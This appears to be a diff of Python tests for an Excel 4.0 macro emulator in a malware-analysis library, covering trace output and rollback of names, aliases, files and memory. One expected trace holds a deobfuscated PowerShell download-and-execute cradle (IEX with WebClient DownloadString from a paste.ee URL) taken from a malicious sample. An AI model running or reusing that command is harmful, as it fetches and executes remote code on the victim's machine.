@@ -1,7 +1,9 @@
 from __future__ import annotations
 
 from refinery.lib.excel import synthesize_formula
+from refinery.lib.excel.formula.model import XlNumber
 from refinery.lib.scripts.xlm import XlmCursor, XlmEngine, XlmReference, XlmView
+from refinery.lib.scripts.xlm.names import XlmNameEntry
 from refinery.lib.scripts.xlm.trace import XlmSeverity, XlmStatus
 from test import TestBase
 from test.lib.excel.samples import (
@@ -70,7 +72,8 @@ class TestXlmEngineTraces(TestBase):
         self.assertEqual(steps[0].status, XlmStatus.PartialEvaluation)
         self.assertEqual(
             steps[0].text,
-            '=EXEC("powershell -Command Acf444!A9590:Acf444!A9590")',
+            '=EXEC("powershell -Command IEX (new`-OB`jeCT(\'Net.WebClient\')).'
+            '\'DoWnloAdsTrInG\'(\'ht\'+\'tp://paste.ee/r/pLpR9\')")',
         )
 
     def test_the_rpn_sample_walks_its_column_one_row_at_a_time(self):
@@ -207,6 +210,11 @@ class TestXlmEngineControl(TestBase):
         self.assertEqual(steps[12].row, 112)
         self.assertEqual(steps[-1].row, 121)
 
+    def test_a_false_branch_rolls_back_the_name_its_true_branch_defined(self):
+        steps, engine = _run(('AZ110', 'IF(AZ112,SET.NAME("probe",42),1)'))
+        self.assertEqual(steps[2].text, '[TRUE] SET.NAME(probe,42)')
+        self.assertEqual(engine.view.names.resolve('probe'), None)
+
     def test_a_run_that_exceeds_its_step_budget_ends_with_an_error_step(self):
         steps = _steps(
             ('AZ110', 'WHILE(TRUE)'),
@@ -276,3 +284,75 @@ class TestXlmEngineJournal(TestBase):
         self.assertEqual(cell.value, 7)
         engine.rollback(position)
         self.assertEqual((cell.value, cell.formula is None), (False, False))
+
+    def test_a_rollback_undoes_a_name_the_rolled_back_run_defined(self):
+        view = XlmView(XLM_MACRO_TEXT_XLSM)
+        engine = XlmEngine(view)
+        position = engine.snapshot()
+        engine.define_name(XlmNameEntry(name='probe', sheet=None, formula=XlNumber(value=42)))
+        resolved = view.names.resolve('probe')
+        assert resolved is not None and resolved.formula is not None
+        self.assertEqual(synthesize_formula(resolved.formula), '42')
+        engine.rollback(position)
+        self.assertEqual(view.names.resolve('probe'), None)
+
+    def test_a_rollback_restores_the_name_a_rolled_back_run_replaced(self):
+        view = XlmView(XLM_MACRO_TEXT_XLSM)
+        engine = XlmEngine(view)
+        entry = view.names.resolve('auto_open')
+        assert entry is not None
+        position = engine.snapshot()
+        engine.define_name(XlmNameEntry(
+            name=entry.name,
+            sheet=entry.sheet,
+            formula=XlNumber(value=42),
+        ))
+        replaced = view.names.resolve('auto_open')
+        assert replaced is not None and replaced.formula is not None
+        self.assertEqual(synthesize_formula(replaced.formula), '42')
+        engine.rollback(position)
+        self.assertEqual(view.names.resolve('auto_open'), entry)
+
+    def test_a_rollback_undoes_an_alias_the_rolled_back_run_registered(self):
+        engine = XlmEngine(XlmView(XLM_MACRO_TEXT_XLSM))
+        engine.register_alias('old', 'Kernel32.Sleep')
+        position = engine.snapshot()
+        engine.register_alias('old', 'urlmon.URLDownloadToFileA')
+        engine.register_alias('fresh', 'urlmon.URLDownloadToFileA')
+        self.assertEqual(engine.aliases, {
+            'old': 'urlmon.URLDownloadToFileA',
+            'fresh': 'urlmon.URLDownloadToFileA',
+        })
+        engine.rollback(position)
+        self.assertEqual(engine.aliases, {'old': 'Kernel32.Sleep'})
+
+    def test_a_rollback_undoes_the_files_a_run_opened_and_wrote(self):
+        engine = XlmEngine(XlmView(XLM_MACRO_TEXT_XLSM))
+        position = engine.snapshot()
+        engine.open_file(r'C:\Users\Public\note.txt')
+        self.assertTrue(engine.write_file(r'C:\Users\Public\note.txt', 'payload'))
+        engine.rollback(position)
+        self.assertEqual(engine.files.size(r'C:\Users\Public\note.txt'), None)
+        self.assertFalse(engine.write_file(r'C:\Users\Public\note.txt', 'payload'))
+
+    def test_a_rollback_undoes_the_memory_a_run_allocated_and_wrote(self):
+        engine = XlmEngine(XlmView(XLM_MACRO_TEXT_XLSM))
+        position = engine.snapshot()
+        base = engine.allocate_memory(4194304, 4096)
+        self.assertTrue(engine.write_memory(base, b'\xde\xad\xbe\xef', 4))
+        self.assertEqual(engine.memory.peek(base, 4), b'\xde\xad\xbe\xef')
+        engine.rollback(position)
+        self.assertEqual(engine.memory.peek(base, 4), None)
+        self.assertFalse(engine.write_memory(base, b'\xde\xad\xbe\xef', 4))
+
+    def test_a_rollback_undoes_the_failed_write_marks_a_run_made(self):
+        engine = XlmEngine(XlmView(XLM_MACRO_TEXT_XLSM))
+        first = XlmReference('Doc1', 200, 52)
+        second = XlmReference('Doc1', 201, 52)
+        engine.mark_failed(first)
+        position = engine.snapshot()
+        engine.mark_failed(second)
+        engine.unmark_failed(first)
+        self.assertEqual(engine.failed_writes, {second})
+        engine.rollback(position)
+        self.assertEqual(engine.failed_writes, {first})
